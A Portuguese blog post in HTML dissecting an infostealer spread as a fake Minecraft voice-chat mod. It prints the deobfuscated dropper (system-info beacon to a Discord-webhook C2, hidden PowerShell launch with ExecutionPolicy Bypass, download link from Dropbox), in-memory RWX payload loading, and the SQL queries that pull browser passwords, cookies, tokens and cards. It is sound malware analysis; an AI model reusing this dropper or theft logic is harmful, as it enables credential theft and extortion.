@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stealers no Brasil</title>
+    <style>
+        body {
+            font-family: "Courier New", Courier, monospace;
+            background-color: #000000;
+            color: #ffffff;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            line-height: 1.6;
+        }
+
+        a {
+            color: #ffffff;
+            text-decoration: none;
+            border-bottom: 1px solid #ffffff;
+            padding-bottom: 1px;
+        }
+
+        a:hover {
+            color: #008800;
+            border-bottom-color: #008800;
+        }
+
+        h1, h2, h3, h4 {
+            color: #d95b29;
+            font-weight: bold;
+            margin-top: 2em;
+            margin-bottom: 1em;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 50px;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            background-color: #ffcc99;
+            border-radius: 8px;
+            margin-right: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            box-shadow: inset 0 0 10px rgba(255, 153, 0, 0.3);
+        }
+
+        .header-info h1 {
+            margin: 0;
+            font-size: 1.8em;
+            color: #ffffff;
+        }
+
+        .nav {
+            margin-top: 5px;
+            font-size: 0.9em;
+        }
+
+        .nav a {
+            color: #d95b29;
+            border-bottom: none;
+        }
+
+        .nav a:hover {
+            text-decoration: underline;
+        }
+
+        .nav span {
+            color: #ccc;
+            margin: 0 5px;
+        }
+
+        .post-header {
+            margin-bottom: 40px;
+            border-bottom: 1px dashed #ccc;
+            padding-bottom: 20px;
+        }
+
+        .post-title {
+            font-size: 2em;
+            margin-top: 0;
+            margin-bottom: 10px;
+            color: #d95b29;
+        }
+
+        .post-meta {
+            font-size: 0.9em;
+            color: #ffffff;
+            margin-bottom: 15px;
+        }
+
+        .post-meta strong {
+            color: #ffffff;
+        }
+
+        .translations {
+            font-size: 0.85em;
+            color: #d95b29;
+        }
+
+        .translations a {
+            color: #d95b29;
+            border: none;
+        }
+
+        .translations a:hover {
+            text-decoration: underline;
+        }
+
+        .post-content {
+            font-size: 0.95em;
+            text-align: justify;
+        }
+
+        .post-content p {
+            margin-bottom: 1.5em;
+        }
+
+        .toc {
+            background-color: #1a1a1a;
+            padding: 20px;
+            border-left: 4px solid #ffffff;
+            margin-bottom: 30px;
+        }
+
+        .toc h3 {
+            margin-top: 0;
+            font-size: 1.2em;
+        }
+
+        .toc ul {
+            list-style-type: none;
+            padding-left: 20px;
+            margin: 0;
+        }
+
+        .toc li {
+            margin-bottom: 5px;
+        }
+
+        .toc a {
+            border-bottom: none;
+        }
+
+        .toc a:hover {
+            text-decoration: underline;
+        }
+
+        pre {
+            background-color: #1a1a1a;
+            padding: 15px;
+            overflow-x: auto;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 0.9em;
+        }
+
+        code {
+            background-color: #e8e8e8;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: inherit;
+            color: #b30000;
+        }
+
+        pre code {
+            background-color: transparent;
+            padding: 0;
+            color: #ffffff;
+        }
+
+        blockquote {
+            border-left: 4px solid #ffffff;
+            margin: 1.5em 0;
+            padding: 0.5em 20px;
+            color: #ffffff;
+            font-style: italic;
+            background-color: #1a1a1a;
+        }
+
+        .code-window {
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 25px 0;
+            border: 1px solid #333;
+            background-color: #161616;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.4);
+        }
+
+        .code-window-bar {
+            background-color: #2b2b2b;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+
+        .dot {
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .dot.red { background-color: #ff5f56; }
+        .dot.yellow { background-color: #ffbd2e; }
+        .dot.green { background-color: #27c93f; }
+
+        .code-window-title {
+            margin-left: 8px;
+            color: #999;
+            font-size: 0.78em;
+        }
+
+        .code-window pre {
+            margin: 0;
+            border: none;
+            border-radius: 0;
+            background-color: #161616;
+        }
+
+        .code-window pre code {
+            color: #d4d4d4;
+        }
+
+        .cw-comment { color: #6a9955; }
+        .cw-str { color: #ce9178; }
+        .cw-kw { color: #569cd6; }
+        .cw-type { color: #4ec9b0; }
+        .cw-func { color: #dcdcaa; }
+        .cw-num { color: #b5cea8; }
+
+        .bn-window {
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 25px 0;
+            border: 1px solid #333;
+            background-color: #1e1e1e;
+            font-size: 0.83em;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.4);
+        }
+
+        .bn-titlebar {
+            background-color: #2d2d30;
+            color: #ccc;
+            padding: 9px 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #3e3e3e;
+            font-size: 0.85em;
+        }
+
+        .bn-titlebar .bn-tab {
+            color: #d4d4d4;
+        }
+
+        .bn-titlebar .bn-status {
+            color: #5a8fbd;
+            font-size: 0.85em;
+        }
+
+        .bn-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .bn-table td {
+            padding: 1px 14px;
+            white-space: pre;
+            font-family: "Courier New", Courier, monospace;
+            vertical-align: top;
+        }
+
+        .bn-addr {
+            color: #5a8fbd;
+            width: 1%;
+            white-space: nowrap;
+            text-align: right;
+            border-right: 1px solid #303030;
+            user-select: none;
+        }
+
+        .bn-code {
+            color: #d4d4d4;
+            width: 100%;
+        }
+
+        .bn-kw { color: #569cd6; }
+        .bn-type { color: #4ec9b0; }
+        .bn-func { color: #dcdcaa; }
+        .bn-num { color: #b5cea8; }
+        .bn-comment { color: #6a9955; }
+        .bn-var { color: #9cdcfe; }
+
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 0.85em;
+        }
+
+        .data-table th, .data-table td {
+            border: 1px solid #333;
+            padding: 8px 10px;
+            text-align: left;
+            vertical-align: top;
+        }
+
+        .data-table th {
+            background-color: #1a1a1a;
+            color: #d95b29;
+        }
+
+        .data-table code {
+            font-size: 0.95em;
+        }
+
+        .footer {
+            margin-top: 80px;
+            padding-top: 20px;
+            border-top: 1px dashed #ccc;
+            font-size: 0.85em;
+            color: #777;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .footer-nav a {
+            color: #777;
+            border: none;
+        }
+
+        .footer-nav a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="header-info">
+            <h1>pa1va.top</h1>
+            <div class="nav">
+                <a href="../../index.html">Home</a> <span>|</span>
+                <a href="#">About</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-header">
+        <h1 class="post-title">Stealers no Brasil</h1>
+        <div class="post-meta">
+            <strong>pa1va.top</strong> | 2026-06-20
+        </div>
+        <div class="translations">
+            [ <a href="#">Português</a> ]
+        </div>
+    </div>
+
+    <div class="post-content">
+
+        <p>Um dia eu me perguntei: por que no Brasil há tantos vazamentos de dados? Acredito que o Brasil seja um dos países que mais "entrega" dados no mundo e simplesmente de graça. Mas você já parou para pensar no porquê disso?</p>
+
+        <div class="toc">
+            <h3>Sumário</h3>
+            <ul>
+                <li><a href="#motivacao">1. Minha motivação para entrar nessa área</a></li>
+                <li><a href="#malware">2. O que é um Malware?</a></li>
+                <li><a href="#stealer">3. O que é um Stealer?</a></li>
+                <li><a href="#infeccao">4. Como as pessoas são infectadas?</a></li>
+                <li><a href="#caso-real">5. Caso real de infecção por Stealer</a></li>
+                <li><a href="#analise-1">6. Analisando o Malware I - O Dropper</a></li>
+                <li><a href="#analise-2">7. Analisando o Malware II - O Executável</a></li>
+                <li><a href="#confronto">8. O confronto com o operador</a></li>
+                <li><a href="#conclusao">9. A grande pergunta</a></li>
+            </ul>
+        </div>
+
+        <h2 id="motivacao">1. Minha motivação para entrar nessa área</h2>
+        <p>Refletindo sobre a minha infância e como comecei a me interessar pela área de tecnologia, lembrei que a primeira vez que meu computador foi infectado por um vírus foi porque eu queria usar um cheat (trapaça) para um jogo específico.</p>
+
+        <p>Pesquisei no YouTube e vi um vídeo ensinando como baixar. Baixei, executei, e o resultado veio algumas semanas depois: alguém que nunca soubemos quem foi usou o cartão do meu pai para fazer compras, se eu não me engano, R$ 1.000, que na época era bastante dinheiro. Minha mãe contou o caso para um primo dela, que logo desconfiou que o computador de casa estava infectado. A hipótese dele estava certa: o "cheat" que eu tinha baixado era, na verdade, um malware (vírus) que roubava dados do computador.</p>
+
+        <h2 id="malware">2. O que é um Malware?</h2>
+        <p>Malware vem de Malicious (Malicioso) + Software, ou seja, "Software Malicioso". Ele pode se passar por um programa comum, mas o que o torna malicioso é ter, em sua execução, algo ilícito: roubar seus dados, permitir que o operador acesse seu computador remotamente, entre outros exemplos. Existe até malware "troll", cuja intenção não é o lucro, mas apenas atrapalhar e danificar o computador da vítima.</p>
+
+        <h2 id="stealer">3. O que é um Stealer?</h2>
+        <p>Stealer, também conhecido como InfoStealer, é um malware ladrão de dados. Seu objetivo é roubar os dados presentes no computador da vítima, estes dados que caem nas mãos do operador do stealer e que, na grande maioria dos casos, servem para ganho financeiro.</p>
+
+        <p>Depois que o stealer rouba os dados, os operadores costumam seguir um de dois caminhos:</p>
+        <p>1. Extorquir a vítima, ameaçando vazar seus dados;<br>
+        2. Reunir os dados numa base e vendê-la em grupos do Telegram ou fóruns.</p>
+
+        <h2 id="infeccao">4. Como as pessoas são infectadas?</h2>
+        <p>As pessoas não são infectadas do nada, mas há sempre alguma motivação por trás, ainda que não intencional. No meu caso, a motivação foi querer um cheat para um jogo que eu costumava jogar. Baixei um software de um desconhecido no YouTube e fui infectado.</p>
+
+        <p>Para deixar isso mais claro, vou contar um caso real mais à frente.</p>
+
+        <h2 id="caso-real">5. Caso real de infecção por Stealer</h2>
+        <p>Esse caso que vou contar é real. Eu estava navegando no Twitter quando vi uma pessoa relatando que teve os dados de suas redes sociais roubados. Com esses dados em mãos, o operador do stealer entrou em contato com a vítima e tentou extorqui-la.</p>
+
+        <p>O operador já tinha coletado informações bancárias da vítima e sabia até o limite disponível em sua conta. Disse então que devolveria os acessos roubados caso a vítima fizesse um pagamento via Pix.</p>
+
+        <p>A vítima se recusou. O operador passou a pressioná-la, ameaçando avisar os familiares ou expor fotos íntimas caso o pagamento não fosse feito.</p>
+
+        <p>É uma situação desesperadora. Não sei se a vítima acabou pagando.</p>
+
+        <h2 id="analise-1">6. Analisando o Malware I - O Dropper</h2>
+        <p>Entrei em contato com a vítima pelo próprio Twitter perguntando sobre a situação, e ela me passou o site onde havia baixado um mod para Minecraft. O mod prometia uma função de chat por voz por proximidade entre os jogadores.</p>
+
+        <p>Baixei o mesmo mod que a vítima baixou. Como era um mod em Java, descompactei o arquivo para vasculhar o conteúdo. Para surpresa de ninguém, o código principal estava ofuscado em hexadecimal. Para entender o que ele realmente fazia, precisei desofuscá-lo, foi bem simples, pois o próprio método de desofuscação estava dentro do próprio código, para os curiosos:</p>
+
+        <div class="code-window">
+    <div class="code-window-bar">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span class="code-window-title">Decoder.java</span>
+    </div>
+    <pre><code>    <span class="cw-comment">// Função que converte (desofusca) a string hexadecimal para revelar o texto original</span>
+    <span class="cw-kw">private static</span> <span class="cw-type">String</span> <span class="cw-func">aak2</span>(<span class="cw-type">String</span> hex) {
+        <span class="cw-kw">if</span> (hex != <span class="cw-kw">null</span> &amp;&amp; !hex.<span class="cw-func">isEmpty</span>()) {
+            <span class="cw-kw">int</span> len = hex.<span class="cw-func">length</span>();
+            <span class="cw-kw">byte</span>[] data = <span class="cw-kw">new</span> <span class="cw-kw">byte</span>[(len + <span class="cw-num">2</span>) / <span class="cw-num">3</span>];
+            <span class="cw-kw">int</span> idx = <span class="cw-num">0</span>;
+
+            <span class="cw-kw">for</span>(<span class="cw-kw">int</span> i = <span class="cw-num">0</span>; i &lt; len; i += <span class="cw-num">2</span>) {
+                <span class="cw-kw">while</span>(i &lt; len &amp;&amp; hex.<span class="cw-func">charAt</span>(i) == <span class="cw-str">' '</span>) {
+                    ++i;
+                }
+
+                <span class="cw-kw">if</span> (i + <span class="cw-num">1</span> &gt;= len) {
+                    <span class="cw-kw">break</span>;
+                }
+
+                data[idx++] = (<span class="cw-kw">byte</span>)((<span class="cw-type">Character</span>.<span class="cw-func">digit</span>(hex.<span class="cw-func">charAt</span>(i), <span class="cw-num">16</span>) &lt;&lt; <span class="cw-num">4</span>) + <span class="cw-type">Character</span>.<span class="cw-func">digit</span>(hex.<span class="cw-func">charAt</span>(i + <span class="cw-num">1</span>), <span class="cw-num">16</span>));
+            }
+
+            <span class="cw-kw">byte</span>[] out = <span class="cw-kw">new</span> <span class="cw-kw">byte</span>[idx];
+            <span class="cw-type">System</span>.<span class="cw-func">arraycopy</span>(data, <span class="cw-num">0</span>, out, <span class="cw-num">0</span>, idx);
+            <span class="cw-kw">return new</span> <span class="cw-type">String</span>(out, <span class="cw-type">StandardCharsets</span>.UTF_8);
+        } <span class="cw-kw">else</span> {
+            <span class="cw-kw">return</span> <span class="cw-str">""</span>;
+        }
+    }</code></pre>
+</div>
+
+        <p>Abaixo, o trecho relevante já desofuscado. Os pontos importantes: a constante com o link direto para o verdadeiro malware (sem precisar de login no Dropbox), a thread que coleta dados básicos da vítima logo na inicialização, a função que avisa o operador via Webhook do Discord, bem comum ele ser usado como C2 (Comando e Controle), e a função que prepara a execução oculta via PowerShell.</p>
+
+        <div class="code-window">
+            <div class="code-window-bar">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="code-window-title">BetaClient.java</span>
+            </div>
+            <pre><code><span class="cw-kw">@Mod</span>(<span class="cw-str">"voicebeta"</span>)
+<span class="cw-kw">public class</span> <span class="cw-type">BetaClient</span> {
+
+    <span class="cw-comment">// Link para baixar o verdadeiro malware diretamente no dropbox</span>
+    <span class="cw-kw">private static final</span> <span class="cw-type">String</span> HAHAHA_OW =
+        <span class="cw-str">"https://www.dropbox.com/scl/fi/00000000000000/00000000000.exe"</span>;
+
+    <span class="cw-func">public VoiceBetaClient</span>() {
+        (<span class="cw-kw">new</span> <span class="cw-type">Thread</span>(() -&gt; {
+            <span class="cw-kw">try</span> {
+                Thread.<span class="cw-func">sleep</span>(<span class="cw-num">5000L</span>);
+
+                <span class="cw-comment">// Coleta informações básicas do sistema da vítima</span>
+                <span class="cw-type">String</span> var1 = System.<span class="cw-func">getProperty</span>(<span class="cw-str">"os.name"</span>);
+                <span class="cw-type">String</span> var2 = <span class="cw-str">"Mod Status"</span>;
+                <span class="cw-type">String</span> var3 = <span class="cw-str">"&gt;&gt;&gt; Mod inicializado com sucesso\nSistema: **"</span>;
+
+                <span class="cw-comment">// Envia um log para o C2 avisando que o computador foi infectado</span>
+                <span class="cw-func">akloer</span>(var2, var3 + var1 + <span class="cw-str">"**\nUsuario: **"</span>
+                    + System.<span class="cw-func">getProperty</span>(<span class="cw-str">"user.name"</span>) + <span class="cw-str">"**"</span>);
+
+                <span class="cw-comment">// (...) omitido</span>
+            } <span class="cw-kw">catch</span> (<span class="cw-type">Exception</span> e) {
+                <span class="cw-comment">// (...) omitido</span>
+            }
+        })).<span class="cw-func">start</span>();
+    }
+
+    <span class="cw-comment">// Notifica o operador via Webhook do Discord (C2)</span>
+    <span class="cw-kw">private static void</span> <span class="cw-func">akloer</span>(<span class="cw-type">String</span> title, <span class="cw-type">String</span> message) {
+        <span class="cw-kw">try</span> {
+            <span class="cw-type">String</span> var34 = <span class="cw-str">"https://discord.com/api/webhooks/000000000000000000/0000000000000000"</span>;
+            <span class="cw-kw">if</span> (var34.<span class="cw-func">isEmpty</span>() || var34.<span class="cw-func">equals</span>(<span class="cw-str">"%WEBHOOK_URL%"</span>)) {
+                <span class="cw-kw">return</span>;
+            }
+            <span class="cw-comment">// (...) omitido</span>
+        } <span class="cw-kw">catch</span> (<span class="cw-type">Exception</span> e) {
+            <span class="cw-comment">// (...) omitido</span>
+        }
+    }
+
+    <span class="cw-comment">// Prepara o PowerShell para executar o stealer baixado, de forma oculta</span>
+    <span class="cw-kw">private static</span> <span class="cw-type">ProcessBuilder</span> <span class="cw-func">initakl</span>(<span class="cw-type">Path</span> caminhoExecutavel) {
+        <span class="cw-type">String</span> diretorio = caminhoExecutavel.<span class="cw-func">toString</span>();
+        <span class="cw-type">String</span>[] comando = <span class="cw-kw">new</span> <span class="cw-type">String</span>[]{
+            <span class="cw-str">"powershell.exe"</span>,
+            <span class="cw-str">"-WindowStyle"</span>, <span class="cw-str">"Hidden"</span>,
+            <span class="cw-str">"-ExecutionPolicy"</span>, <span class="cw-str">"Bypass"</span>,
+            <span class="cw-str">"-Command"</span>, <span class="cw-kw">null</span>
+        };
+        comando[<span class="cw-num">6</span>] = <span class="cw-str">"Start-Process -FilePath '"</span> + diretorio + <span class="cw-str">"' -WindowStyle Hidden"</span>;
+        <span class="cw-kw">return new</span> <span class="cw-type">ProcessBuilder</span>(comando);
+    }
+}</code></pre>
+        </div>
+
+        <p>Mostrei acima as partes básicas do dropper. Agora vamos analisar o executável, que é o malware propriamente dito.</p>
+
+        <h2 id="analise-2">7. Analisando o Malware II - O Executável</h2>
+        <p>Ao abrir o executável, fui atrás das funções clássicas de um stealer que é a leitura de arquivos de configuração de navegadores, manipulação de SQLite, rotinas de criptografia. Inicialmente não encontrei nada óbvio, o que achei estranho. O trecho que realmente chamou minha atenção foi este, já no pseudo-C gerado pelo Binary Ninja:</p>
+
+        <div class="bn-window">
+            <div class="bn-titlebar">
+                <span class="bn-tab">sub_140001e70</span>
+                <span class="bn-status">x86-64</span>
+            </div>
+            <table class="bn-table">
+                <tr><td class="bn-addr">140001e70</td><td class="bn-code"><span class="bn-type">int64_t</span> <span class="bn-func">sub_140001e70</span>(<span class="bn-type">int64_t</span>* arg1)</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">{</td></tr>
+                <tr><td class="bn-addr">140001e75</td><td class="bn-code">    <span class="bn-type">int64_t</span> <span class="bn-var">lpAddress_1</span> = <span class="bn-func">VirtualAlloc</span>(*(<span class="bn-type">uint64_t</span>*)((<span class="bn-type">char</span>*)<span class="bn-var">r15_1</span> + <span class="bn-num">0x30</span>),</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">        (<span class="bn-type">uint64_t</span>)*(<span class="bn-type">uint32_t</span>*)((<span class="bn-type">char</span>*)<span class="bn-var">r15_1</span> + <span class="bn-num">0x50</span>), <span class="bn-num">MEM_COMMIT</span> | <span class="bn-num">MEM_RESERVE</span>,</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">        <span class="bn-num">PAGE_EXECUTE_READWRITE</span>);</td></tr>
+                <tr><td class="bn-addr">140001e8e</td><td class="bn-code">    <span class="bn-type">int64_t</span> <span class="bn-var">lpAddress</span> = <span class="bn-var">lpAddress_1</span>;</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">&nbsp;</td></tr>
+                <tr><td class="bn-addr">140001e95</td><td class="bn-code">    <span class="bn-kw">if</span> (!<span class="bn-var">lpAddress_1</span>)</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">    {</td></tr>
+                <tr><td class="bn-addr">140001e9c</td><td class="bn-code">        <span class="bn-type">int64_t</span> <span class="bn-var">lpAddress_2</span> = <span class="bn-func">VirtualAlloc</span>(<span class="bn-kw">nullptr</span>,</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">            (<span class="bn-type">uint64_t</span>)*(<span class="bn-type">uint32_t</span>*)((<span class="bn-type">char</span>*)<span class="bn-var">r15_1</span> + <span class="bn-num">0x50</span>), <span class="bn-num">MEM_COMMIT</span> | <span class="bn-num">MEM_RESERVE</span>,</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">            <span class="bn-num">PAGE_EXECUTE_READWRITE</span>);</td></tr>
+                <tr><td class="bn-addr">140001eb3</td><td class="bn-code">        <span class="bn-var">lpAddress</span> = <span class="bn-var">lpAddress_2</span>;</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">&nbsp;</td></tr>
+                <tr><td class="bn-addr">140001eb8</td><td class="bn-code">        <span class="bn-kw">if</span> (!<span class="bn-var">lpAddress_2</span>)</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">        {</td></tr>
+                <tr><td class="bn-addr">140001ec0</td><td class="bn-code">            <span class="bn-func">sub_140001300</span>(&amp;exceptionObject, &amp;data_1402e6d24);</td></tr>
+                <tr><td class="bn-addr">140001ed2</td><td class="bn-code">            <span class="bn-func">_CxxThrowException</span>(&amp;exceptionObject, &amp;data_1402e7a98);</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">            <span class="bn-comment">/* no return */</span></td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">        }</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">    }</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">&nbsp;</td></tr>
+                <tr><td class="bn-addr">140001ee5</td><td class="bn-code">    <span class="bn-type">HANDLE</span> <span class="bn-var">rax_11</span> = <span class="bn-func">CreateThread</span>(<span class="bn-kw">nullptr</span>, <span class="bn-num">0</span>,</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">        (<span class="bn-type">uint64_t</span>)*(<span class="bn-type">uint32_t</span>*)((<span class="bn-type">char</span>*)<span class="bn-var">r15_1</span> + <span class="bn-num">0x28</span>) + <span class="bn-var">lpAddress</span>, <span class="bn-kw">nullptr</span>,</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">        <span class="bn-num">THREAD_CREATE_RUN_IMMEDIATELY</span>, <span class="bn-kw">nullptr</span>);</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">&nbsp;</td></tr>
+                <tr><td class="bn-addr">140001f02</td><td class="bn-code">    <span class="bn-kw">if</span> (<span class="bn-var">rax_11</span>)</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">    {</td></tr>
+                <tr><td class="bn-addr">140001f08</td><td class="bn-code">        <span class="bn-func">WaitForSingleObject</span>(<span class="bn-var">rax_11</span>, <span class="bn-num">0xffffffff</span>);</td></tr>
+                <tr><td class="bn-addr">140001f1a</td><td class="bn-code">        <span class="bn-func">CloseHandle</span>(<span class="bn-var">rax_11</span>);</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">        <span class="bn-comment">/* tailcall */</span></td></tr>
+                <tr><td class="bn-addr">140001f24</td><td class="bn-code">        <span class="bn-kw">return</span> <span class="bn-func">VirtualFree</span>(<span class="bn-var">lpAddress</span>, <span class="bn-num">0</span>, <span class="bn-num">MEM_RELEASE</span>);</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">    }</td></tr>
+                <tr><td class="bn-addr"></td><td class="bn-code">}</td></tr>
+            </table>
+        </div>
+
+        <p>O código aloca uma região de memória com permissão de leitura, escrita e execução (RWX, via <code>PAGE_EXECUTE_READWRITE</code>) primeiro tentando um endereço preferencial e, se isso falhar, deixando o próprio sistema escolher (<code>VirtualAlloc</code> com <code>nullptr</code>). Em seguida, cria uma thread apontando para dentro dessa região recém-alocada e espera a execução terminar antes de liberar a memória. Esse é o padrão clássico de carregamento de um payload em tempo de execução: normalmente um estágio adicional do malware sendo decifrado e executado diretamente em memória, sem nunca tocar o disco.</p>
+
+        <p>Usei a ferramenta <strong>Hollows Hunter</strong>, da pesquisadora polonesa hasherezade (<a href="https://github.com/hasherezade/hollows_hunter">github.com/hasherezade/hollows_hunter</a>), para confirmar a suspeita ela não detecta só "hollowing" clássico, mas várias formas de código injetado/implantado em processos. Executei o malware e, em seguida, rodei a ferramenta. Resultado: o operador havia injetado duas DLLs nos meus navegadores:</p>
+
+        <div class="code-window">
+            <div class="code-window-bar">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="code-window-title">hollows_hunter.exe</span>
+            </div>
+            <pre><code>SUMMARY:
+Scan at: 06/09/26 12:11:29 (1781017889)
+Finished scan in: 24766 ms. = 24.766 sec.
+[*] Total scanned: 107
+[*] Total suspicious: 2
+[+] List of suspicious:
+[0]: PID: 4444, Name: msedge.exe
+[1]: PID: 8944, Name: opera.exe</code></pre>
+        </div>
+
+        <p>Carreguei as duas DLLs encontradas no Binary Ninja e finalmente achei o que esperava: consultas SQL feitas diretamente sobre os bancos SQLite usados por navegadores baseados em Chromium (Chrome, Edge, Opera, Brave, etc.), os arquivos <code>Login Data</code>, <code>Cookies</code> e <code>Web Data</code>, que ficam na pasta de perfil do navegador, para extrair credenciais e outras informações sensíveis salvas localmente, para serem enviadas ao C2.</p>
+
+        <table class="data-table">
+            <tr>
+                <th>Tipo de dado</th>
+                <th>Query SQL</th>
+                <th>Arquivo de saída do stealer</th>
+            </tr>
+            <tr>
+                <td>Senhas</td>
+                <td><code>SELECT origin_url, username_value, password_value FROM logins</code></td>
+                <td>passwords.json</td>
+            </tr>
+            <tr>
+                <td>Cookies</td>
+                <td><code>SELECT host_key, name, ..., encrypted_value FROM cookies</code></td>
+                <td>cookies.txt</td>
+            </tr>
+            <tr>
+                <td>Tokens OAuth</td>
+                <td><code>SELECT service, encrypted_token FROM token_service</code></td>
+                <td>Tokens.json</td>
+            </tr>
+            <tr>
+                <td>Cartões</td>
+                <td><code>SELECT guid, name_on_card, card_number_encrypted FROM credit_cards</code></td>
+                <td>cards.json</td>
+            </tr>
+            <tr>
+                <td>IBANs</td>
+                <td><code>SELECT value_encrypted, nickname FROM local_ibans</code></td>
+                <td>iban.json</td>
+            </tr>
+        </table>
+
+        <h2 id="confronto">8. O confronto com o operador</h2>
+        <p>Depois de descobrir tudo o que eu queria saber sobre o funcionamento do malware, resolvi me divertir um pouco às custas do operador. Spammei o C2 dele com mensagens e pedi para ele me adicionar no Discord. Ele aceitou, e bom, ele ficou bem bravo comigo. Pela forma de falar e pelo comportamento, perguntei a idade dele, e tive a confirmação da minha hipótese: era paulista e menor de idade.</p>
+
+        <p>Perguntei sobre seus "feitos", e ele contou que já tinha conseguido extorquir um homem casado, ganhando R$ 4.000 via Pix. Ele havia acessado o Instagram da vítima e encontrado indícios de traição, o que usou como argumento para a extorsão.</p>
+
+        <h2 id="conclusao">9. A grande pergunta</h2>
+        <p>O que aprendemos com isso?</p>
+        <p>A) O malware é ruim?<br>
+        B) Nunca instalar softwares crackeados (ou mods de fontes não oficiais)<br>
+        C) Analisar malware é divertido?</p>
+        <p>A resposta certa é a letra C!</p>
+        <p>Obrigado por ler até aqui, tchau!</p>
+
+    </div>
+
+    <div class="footer">
+        <div>Copyright © 2026 pa1va.top</div>
+    </div>
+
+</body>
+</html>
